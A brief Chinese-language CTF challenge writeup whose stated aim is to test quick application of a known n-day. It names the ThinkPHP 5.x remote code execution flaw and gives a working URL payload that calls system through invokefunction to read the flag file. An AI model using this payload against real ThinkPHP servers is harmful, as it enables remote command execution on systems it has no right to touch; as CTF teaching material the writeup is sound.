题目制作理念：
考察对于nday的现学现用能力
writeup:
thinkphp5.x的RCE
payload:
?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag